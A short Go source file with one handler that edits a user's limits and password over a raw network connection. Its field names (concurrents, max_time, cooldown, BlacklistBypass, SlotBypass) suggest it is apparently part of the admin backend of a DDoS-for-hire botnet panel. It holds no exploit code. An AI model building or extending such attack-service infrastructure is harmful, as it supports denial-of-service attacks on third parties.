package handlers

import (
	"database/sql"
	"fmt"
	"golang.org/x/crypto/bcrypt"
	"log"
	"net"
)

func EditUser(db *sql.DB, username, key, newValue string, conn net.Conn) {
	switch key {
	case "concurrents", "max_time", "cooldown":
		_, err := db.Exec("UPDATE users SET "+key+"=? WHERE username=?", newValue, username)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Fprintf(conn, "User updated successfully.\r\n")
	case "BlacklistBypass", "CooldownBypass", "DurationBypass", "SlotBypass":
		boolValue := false
		if newValue == "true" {
			boolValue = true
		}
		_, err := db.Exec("UPDATE users SET "+key+"=? WHERE username=?", boolValue, username)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Fprintf(conn, "User updated successfully.\r\n")
	case "password":
		hashedPassword, err := bcrypt.GenerateFromPassword([]byte(newValue), bcrypt.DefaultCost)
		if err != nil {
			log.Fatal(err)
		}
		_, err = db.Exec("UPDATE users SET password=? WHERE username=?", hashedPassword, username)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Fprintf(conn, "Password updated successfully.\r\n")
	default:
		fmt.Fprintf(conn, "Invalid key. Available keys: concurrents, max_time, cooldown, BlacklistBypass, CooldownBypass, DurationBypass, SlotBypass, password\r\n")
	}
}
